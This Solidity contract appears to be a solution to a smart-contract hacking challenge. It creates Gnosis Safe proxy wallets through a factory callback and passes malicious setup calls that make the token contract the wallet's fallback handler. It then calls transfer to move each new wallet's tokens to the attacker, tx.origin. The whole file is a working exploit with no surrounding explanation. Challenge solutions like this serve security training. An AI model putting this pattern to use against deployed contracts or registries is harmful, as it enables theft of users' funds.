// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/contracts/GnosisSafe.sol";
import "@gnosis.pm/contracts/proxies/GnosisSafeProxy.sol";
import "@gnosis.pm/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/contracts/proxies/IProxyCreationCallback.sol";

contract BackdoorAttack {
    address public singleton;
    address public registry;
    GnosisSafeProxyFactory public gspf;

    constructor(
        address _singleton, 
        address _registry, 
        address _gspf
    ) {
        singleton = _singleton;
        registry = _registry;
        gspf = GnosisSafeProxyFactory(_gspf);
    }

    function deploySafesAndStealTokens(bytes[] calldata maliciousSetupCalls, bytes calldata maliciousTransferCall) external {
        // loop over the malicious calls, creating a new proxy per loop
        // which will allow us to then call transfer after the token contract
        // is set up as a fallback contract for the wallet
        for (uint256 i = 0; i < maliciousSetupCalls.length; i++) {
            GnosisSafeProxy newGnosisSafeWallet = gspf.createProxyWithCallback(
                singleton,
                maliciousSetupCalls[i],
                0,
                IProxyCreationCallback(registry)
            );
            
            // transfer tokens to tx.origin, the attacker
            (bool success,) = address(newGnosisSafeWallet).call(maliciousTransferCall);

            // make sure the transfer is made
            require(success, "tokens stealing failed");
        }
    }
}
